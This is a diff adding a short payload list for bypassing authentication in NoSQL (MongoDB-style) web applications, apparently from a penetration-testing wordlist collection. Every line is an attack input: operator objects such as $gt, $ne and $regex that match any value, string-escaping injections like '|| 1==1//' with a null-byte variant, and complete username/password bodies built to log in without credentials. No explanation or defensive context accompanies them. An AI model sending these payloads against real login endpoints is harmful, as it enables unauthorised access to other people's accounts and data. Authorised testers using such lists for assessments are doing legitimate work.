@@ -1,0 +1,13 @@
+# NoSQL Injection Authentication Bypass
+{"$gt": ""}
+{"$ne": null}
+{"$ne": ""}
+{"$regex": ".*"}
+{"$exists": true}
+admin', $or: [ {}, { 'a':'a
+' || 1==1//
+' || 1==1%00
+admin'||'1'=='1
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
